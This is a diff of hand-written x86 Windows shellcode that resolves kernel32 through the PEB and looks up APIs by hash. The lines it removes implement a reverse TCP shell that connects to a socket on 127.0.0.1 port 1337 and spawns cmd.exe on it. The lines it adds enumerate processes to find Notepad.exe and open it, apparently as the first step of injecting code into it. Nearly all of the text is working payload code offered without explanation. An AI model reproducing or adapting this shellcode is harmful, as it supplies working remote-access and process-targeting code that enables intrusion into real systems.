@@ -1,6 +1,6 @@
 start:
        mov ebp, esp
-       sub esp, 0x628
+       sub esp, 0x63c
    find_kernel32:                       
        xor ecx,ecx                     
        mov esi,fs:[ecx+30h]            
@@ -71,149 +71,227 @@ start:
        push 0x16b3fe72
        call dword ptr [ebp+0x04]
        mov [ebp+0x20], eax
-       push 0x006c6c
-       push 0x642e3233
-       push 0x5f327377
+       push 0xe454dfed
+       call dword ptr [ebp+0x04]
+       mov [ebp+0x24], eax
+       push 0x3249baa7
+       call dword ptr [ebp+0x04]
+       mov [ebp+0x28], eax
+       push 0x4776654a
+       call dword ptr [ebp+0x04]
+       mov [ebp+0x2c], eax
+       push 0xefe297c0
+       call dword ptr [ebp+0x04]
+       mov [ebp+0x30], eax
+       push 0x0006c
+       push 0x6c642e6c
+       push 0x6c64746e
        push esp
        call dword ptr [ebp+0x14]
        mov ebx, eax
-       push 0x3bfcedcb
+       push 0x77c93c6
        call dword ptr [ebp+0x04]
-       mov [ebp+0x24], eax
-       push 0xadf509d9
+       mov [ebp+0x34], eax
+       push 0x3e192526
        call dword ptr [ebp+0x04]
-       mov [ebp+0x28], eax
-       push 0xb32dba0c
+       mov [ebp+0x38], eax
+       push 0x77c93c6
        call dword ptr [ebp+0x04]
-       mov [ebp+0x2c], eax
+       mov [ebp+0x3c], eax
+       push 0x3e192526
+       call dword ptr [ebp+0x04]
+       mov [ebp+0x40], eax
        mov esi, ebp
        jmp main
-   ConnectTcp:
+   strlen:
        push ebp
        mov ebp, esp
-       sub esp, 0x18
-       sub esp, 0x190
-       mov [ebp-0x4], esp
-       mov dword ptr [ebp-0x8], 0x202
+       sub esp, 0x8
+       mov dword ptr [ebp-0x4], 0x0
        mov eax, [ebp+0x8]
-       push 0x0
-       push 0x0
-       push eax
-       push 0x0
-       mov [ebp-0xc], esp
-       mov eax, [ebp+0xc]
-       rol ax, 8
-       mov dword ptr [ebp+0xc], eax
-       mov eax, [ebp+0xc]
-       shl eax, 16
-       mov dword ptr [ebp+0xc], eax
-       mov eax, [ebp+0xc]
-       add eax, 2
-       mov dword ptr [ebp-0x10], eax
-       mov eax, [ebp-0xc]
-       mov ebx, [ebp-0x10]
-       mov dword ptr [eax], ebx
-       mov eax, [ebp-0x8]
        mov ebx, [ebp-0x4]
-       push ebx
-       push eax
-       call dword ptr [esi+0x24]
-       push 0x0
-       push 0x0
-       push 0x0
-       push 0x6
-       push 0x1
-       push 0x2
-       call dword ptr [esi+0x28]
-       mov dword ptr [ebp-0x14], eax
-       mov eax, [ebp-0x14]
-       mov ebx, [ebp-0xc]
-       push 0x0
-       push 0x0
-       push 0x0
-       push 0x0
-       push 0x10
-       push ebx
-       push eax
-       call dword ptr [esi+0x2c]
-       mov dword ptr [ebp-0x18], eax
-       mov eax, [ebp-0x14]
+       add eax, ebx
+       mov al, byte ptr[eax]
+       movzx eax, al
+       mov dword ptr [ebp-0x8], eax
+   while_stmt1:
+       mov eax, [ebp-0x8]
+       cmp eax, 0x0
+       jle while_stmt1_end
+       mov eax, [ebp-0x4]
+       add eax, 1
+       mov dword ptr [ebp-0x4], eax
+       mov eax, [ebp+0x8]
+       mov ebx, [ebp-0x4]
+       add eax, ebx
+       mov al, byte ptr[eax]
+       movzx eax, al
+       mov dword ptr [ebp-0x8], eax
+       jmp while_stmt1
+   while_stmt1_end:
+       mov eax, [ebp-0x4]
        mov esp, ebp
        pop ebp
        ret
-   ReverseTcpShell:
+add esp, 0x4
+   strcmp:
        push ebp
        mov ebp, esp
        sub esp, 0x14
-       push 0x0657865
-       push 0x2e646d63
-       mov [ebp-0x4], esp
        mov eax, [ebp+0x8]
-       mov ebx, [ebp+0xc]
-       push ebx
        push eax
-       call ConnectTcp
+       call strlen
+       mov dword ptr [ebp-0x4], eax
+       mov eax, [ebp+0xc]
+       push eax
+       call strlen
        mov dword ptr [ebp-0x8], eax
-       sub esp, 0x44
-       mov [ebp-0xc], esp
-       mov dword ptr [ebp-0x10], 0x0
-   while_stmt1:
+       mov dword ptr [ebp-0xc], 0x0
+       mov eax, [ebp-0x4]
+       mov ebx, [ebp-0x8]
+       cmp eax, ebx
+       je if_stmt1
+       mov eax, 0
+       mov esp, ebp
+       pop ebp
+       ret
+   if_stmt1:
+   while_stmt2:
+       mov eax, [ebp-0xc]
+       mov ebx, [ebp-0x4]
+       cmp eax, ebx
+       jg while_stmt2_end
+       mov eax, [ebp+0x8]
+       mov ebx, [ebp-0xc]
+       add eax, ebx
+       mov al, byte ptr[eax]
+       movzx eax, al
+       mov dword ptr [ebp-0x10], eax
+       mov eax, [ebp+0xc]
+       mov ebx, [ebp-0xc]
+       add eax, ebx
+       mov al, byte ptr[eax]
+       movzx eax, al
+       mov dword ptr [ebp-0x14], eax
        mov eax, [ebp-0x10]
-       cmp eax, 0x11
-       jge while_stmt1_end
+       mov ebx, [ebp-0x14]
+       cmp eax, ebx
+       je if_stmt2
+       mov eax, 0
+       mov esp, ebp
+       pop ebp
+       ret
+   if_stmt2:
+       mov eax, [ebp-0xc]
+       add eax, 1
+       mov dword ptr [ebp-0xc], eax
+       jmp while_stmt2
+   while_stmt2_end:
+       mov eax, 1
+       mov esp, ebp
+       pop ebp
+       ret
+add esp, 0x8
+   OpenProcessByName:
+       push ebp
+       mov ebp, esp
+       sub esp, 0x20
+       push 0x0
+       push 0x2
+       call dword ptr [esi+0x24]
+       mov dword ptr [ebp-0x4], eax
+       push 0x0
+       push 0x0
+       push 0x0
+       push 0x0
+       push 0x0
+       push 0x2
+       call dword ptr [esi+0x3c]
+       mov dword ptr [ebp-0x8], eax
+       mov eax, [ebp-0x8]
+       push 0x190
+       push 0x8
+       push eax
+       call dword ptr [esi+0x40]
+       mov dword ptr [ebp-0xc], eax
+       mov dword ptr [ebp-0x10], 0x0
+   while_stmt7:
+       mov eax, [ebp-0x10]
+       cmp eax, 0x190
+       jge while_stmt7_end
        mov eax, [ebp-0xc]
        mov ebx, [ebp-0x10]
-       sal ebx, 2
        add eax, ebx
        mov dword ptr [eax], 0x0
        mov eax, [ebp-0x10]
        add eax, 1
        mov dword ptr [ebp-0x10], eax
-       jmp while_stmt1
-   while_stmt1_end:
+       jmp while_stmt7
+   while_stmt7_end:
        mov eax, [ebp-0xc]
-       add eax, 0x2c
-       mov dword ptr [eax], 0x100
-       mov eax, [ebp-0xc]
-       add eax, 0x38
-       mov ebx, [ebp-0x8]
-       mov dword ptr [eax], ebx
-       mov eax, [ebp-0xc]
-       add eax, 0x3c
-       mov ebx, [ebp-0x8]
-       mov dword ptr [eax], ebx
-       mov eax, [ebp-0xc]
-       add eax, 0x40
-       mov ebx, [ebp-0x8]
-       mov dword ptr [eax], ebx
-       sub esp, 0x10
-       mov [ebp-0x14], esp
-       mov eax, [ebp-0xc]
-       mov dword ptr [eax], 0x44
+       add eax, 0
+       mov dword ptr [eax], 0x128
        mov eax, [ebp-0x4]
        mov ebx, [ebp-0xc]
-       mov ecx, [ebp-0x14]
-       push ecx
        push ebx
-       push 0x0
-       push 0x0
-       push 0x0
-       push 0x1
-       push 0x0
-       push 0x0
        push eax
-       push 0x0
-       call dword ptr [esi+0x20]
-       mov eax, 1
+       call dword ptr [esi+0x28]
+       mov eax, [ebp-0xc]
+       add eax, 36
+       mov dword ptr [ebp-0x14], eax
+       mov eax, [ebp+0x8]
+       mov ebx, [ebp-0x14]
+       push ebx
+       push eax
+       call strcmp
+       mov dword ptr [ebp-0x18], eax
+   while_stmt8:
+       mov eax, [ebp-0x18]
+       cmp eax, 0x1
+       je while_stmt8_end
+       mov eax, [ebp-0x4]
+       mov ebx, [ebp-0xc]
+       push ebx
+       push eax
+       call dword ptr [esi+0x2c]
+       mov eax, [ebp-0xc]
+       add eax, 36
+       mov dword ptr [ebp-0x14], eax
+       mov eax, [ebp+0x8]
+       mov ebx, [ebp-0x14]
+       push ebx
+       push eax
+       call strcmp
+       mov dword ptr [ebp-0x18], eax
+       jmp while_stmt8
+   while_stmt8_end:
+       mov eax, [ebp-0xc]
+       add eax, 8
+       mov eax, dword ptr[eax]
+       mov dword ptr [ebp-0x1c], eax
+       mov eax, [ebp-0x1c]
+       push eax
+       push 0x1
+       push 0x20
+       call dword ptr [esi+0x30]
+       mov dword ptr [ebp-0x20], eax
+       mov eax, [ebp-0x1c]
        mov esp, ebp
        pop ebp
        ret
+add esp, 0x4
    main:
        push ebp
        mov ebp, esp
-       push 0x539
-       push 0x100007f
-       call ReverseTcpShell
+       sub esp, 0x8
+       push 0x0657865
+       push 0x2e646170
+       push 0x65746f4e
+       mov [ebp-0x4], esp
+       mov eax, [ebp-0x4]
+       push eax
+       call OpenProcessByName
+       mov dword ptr [ebp-0x8], eax
        mov eax, 1
        mov esp, ebp
        pop ebp
